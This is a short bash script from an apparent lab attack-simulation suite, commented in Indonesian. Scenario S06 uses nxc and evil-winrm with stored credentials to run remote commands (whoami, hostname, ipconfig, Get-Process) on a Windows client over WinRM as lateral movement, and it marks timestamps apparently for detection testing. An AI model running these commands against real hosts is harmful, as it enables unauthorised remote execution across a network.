#!/usr/bin/env bash
# S06 — WinRM lateral movement (nxc/evil-winrm). Kategori: Backdoor/Lateral Movement.
# Target: win-client :5985. Fase: WINDOWS.
SCN=S06; ATTACK_CAT=Backdoor; PHASE=windows
HERE="$(cd "$(dirname "$0")" && pwd)"; . "$HERE/../_lib/common.sh"
need_tool nxc
banner
ensure_up "$WIN"

mark_start "$WIN"
echo "== WinRM auth + eksekusi perintah (nxc) =="
nxc winrm "$WIN" -u "$WIN_USER" -p "$WIN_PASS" -x "whoami; hostname; ipconfig" \
    | tee "$HERE/s06-winrm.nxc" || true
settle 4
# sesi evil-winrm non-interaktif opsional (perintah berurutan via heredoc)
if command -v evil-winrm >/dev/null 2>&1; then
  echo "== evil-winrm sesi singkat =="
  evil-winrm -i "$WIN" -u "$WIN_USER" -p "$WIN_PASS" <<'EOF' || true
whoami
Get-Process | Select-Object -First 5
exit
EOF
fi
mark_end "$WIN"
echo "Output: s06-winrm.nxc"
